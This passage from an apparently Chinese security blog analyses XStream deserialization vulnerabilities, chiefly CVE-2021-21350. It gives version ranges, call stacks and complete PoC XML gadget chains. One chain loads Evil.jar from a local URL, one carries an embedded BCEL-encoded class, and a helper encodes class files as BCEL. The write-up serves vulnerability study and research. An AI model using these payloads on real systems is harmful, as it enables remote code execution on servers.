class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;javafx.collections.ObservableList$1&#x27;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.AbstractList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.Arrays$ArrayList&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&#x27;string-array&#x27;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>Evil<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">&#x27;java.net.URLClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">ucp</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.URLClassPath&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">urls</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">vector</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">capacityIncrement</span>&gt;</span>0<span class="tag">&lt;/<span class="name">capacityIncrement</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">elementCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">elementCount</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">elementData</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:7777/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;/<span class="name">elementData</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">vector</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">urls</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">path</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:7777/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">loaders</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">lmap</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">ucp</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&#x27;concurrent-hash-map&#x27;</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">&#x27;java.net.URLClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>true<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">pdcache</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">pos</span>&gt;</span>-2147483648<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/5d49835dc3814b97810074cff7898c95.png"></p><h3 id="CVE-2021-21350"><a href="#CVE-2021-21350" class="headerlink" title="CVE-2021-21350"></a>CVE-2021-21350</h3><h4 id="影响范围-8"><a href="#影响范围-8" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.15</p><p>特别注意：JDK &gt;&#x3D;  8u231 可用，其余低版本都会遇到下面这个报错，即便修复了 <code>&lt;outer-class&gt;</code> 报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Caused by: com.sun.tools.javac.processing.AnnotationProcessingError: java.lang.NullPointerException</span><br></pre></td></tr></table></figure><h4 id="版本说明-8"><a href="#版本说明-8" class="headerlink" title="版本说明"></a>版本说明</h4><ul><li>1.3.x 会直接报错</li><li>1.4.15 以后添加了黑名单，和上面是同一个黑名单。</li></ul><h4 id="漏洞分析-8"><a href="#漏洞分析-8" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质： source 是<code>java.util.PriorityQueue#readObject</code>，sink  还是<code>JavacProcessingEnvironment$NameProcessIterator#hasNext</code>，与上一条链的区别是不使用<code>URLClassLoader</code>类，改成使用 bcel 链的 <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，从而可以实现不出网利用。</p><figure class="highlight java"><figcaption><span>title:"Class文件转BCEL字节码"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">file2bcelcode</span><span class="params">(String classFilePath)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(classFilePath));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;$$BCEL$$&quot;</span>+Utility.encode(bytecode, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;javafx.collections.ObservableList$1&#x27;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.AbstractList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.Arrays$ArrayList&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&#x27;string-array&#x27;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$bbN$CA$U$3d$D$L$b3$ac$8b$bc$E$df$P$w$81B$g$3b$88$8d$c1F$U$pD$eba$9c$90$c5e$97$y$D$e1$8f$aci$d0X$f8$B$7e$94$f1$ee$c6$A$89S$dc$c7$b9$e7$9c$99$3b$df$3f$9f_$A$$Q$b6$60$oo$a1$80$j$T$c50$978v$z$q$b0$c7$b1$cfq$c0$90l$3a$9e$a3$af$Y$e2$95$ea$T$83q$ed$bf$u$86L$db$f1$d4$fdt$d4WAO$f4$5dB$cc$a6t$ff$98$e9$ae$W$f2$f5N$8c$a3$R$Z2X$5d$7f$gHu$e3$84$d4Tk$e6$b8$XC1$T6R$b08$Om$i$e1$98$cc$a5p$a5$8d$T$9c2$U$c2y$dd$V$de$a0$de$9aK5$d6$8e$ef$d98$83E$b4P$cf$90$5d3$3a$fd$a1$92$9a$n$b7$86$k$a7$9evFt$9b5Pz$d5$U$x$d5$f6$3fN$83$y$d5$5cI$86$f3$ca$c6$b4$ab$D$c7$h46$F$P$81$_$d5dB$82$cc$98$86$3aZ$b4$X$I$a9P$G$a7$bf$MO$M$y$5c$8b$e2$Wu$c7$94$Z$e5D$ed$jlA$F$83M1$Z$81$f4mH$af$a8$9dH$K$e4$3f$Q$cb$c7$970$9e$df$60$de$d6$96H$$$o$3cE$ca$EqB$7d$89$w$c0$m$8cGh$9a$is$e4$b6M$uG$ac$cd$911H$94$8d$de$93$fb$F$3c$qq$f9$f1$B$A$A<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">parent</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.Launcher$ExtClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&#x27;hashtable&#x27;</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">classes</span> <span class="attr">defined-in</span>=<span class="string">&#x27;java.lang.ClassLoader&#x27;</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">packages</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">nativeLibraries</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">assertionLock</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;..&#x27;</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">defaultAssertionStatus</span>&gt;</span>false<span class="tag">&lt;/<span class="name">defaultAssertionStatus</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>sun.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">repository</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.SyntheticRepository&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">__path</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">paths</span>/&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">class__path</span>&gt;</span>.<span class="tag">&lt;/<span class="name">class__path</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">__path</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">__loadedClasses</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">deferTo</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.Launcher$ExtClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../parent&#x27;</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">defineClass:635, ClassLoader (java.lang)</span><br><span class="line">loadClass:163, ClassLoader (com.sun.org.apache.bcel.internal.util)</span><br><span class="line">loadClass:351, ClassLoader (java.lang)</span><br><span class="line">hasNext:409, JavacProcessingEnvironment$NameProcessIterator (com.sun.tools.javac.processing)</span><br><span class="line">hasMoreElements:148, MultiUIDefaults$MultiUIDefaultsEnumerator (javax.swing)</span><br><span class="line">nextStream:109, SequenceInputStream (java.io)</span><br><span class="line">read:211, SequenceInputStream (java.io)</span><br><span class="line">readFrom:65, ByteArrayOutputStreamEx (com.sun.xml.internal.bind.v2.util)</span><br><span class="line">get:182, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">toString:286, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">compare:153, ObservableList$1 (javafx.collections)</span><br><span class="line">siftDownUsingComparator:722, PriorityQueue (java.util)</span><br><span class="line">siftDown:688, PriorityQueue (java.util)</span><br><span class="line">heapify:737, PriorityQueue (java.util)</span><br><span class="line">readObject:797, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">callReadObject:132, SerializationMembers (com.thoughtworks.xstream.core.util)</span><br><span class="line">doUnmarshal:443, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1404, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1383, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1277, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:24, Vul (POC.priorityQueue)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-29505"><a href="#CVE-2021-29505" class="headerlink" title="CVE-2021-29505"></a>CVE-2021-29505</h3><p><strong>Jasper 的叨叨念</strong>：这里官网使用的是 priorityQueue 作为入口，但是 baizhu 师傅在 tabby 分析利用链的时候使用的是 sorted-map，所以如果看的是他的文章，可能会出现很迷惑的地方，特此说明。</p><h4 id="影响范围-9"><a href="#影响范围-9" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.16</p><p>jdk &lt; 8u231，没有深究是 CC6 还是 XStream 的问题，总之 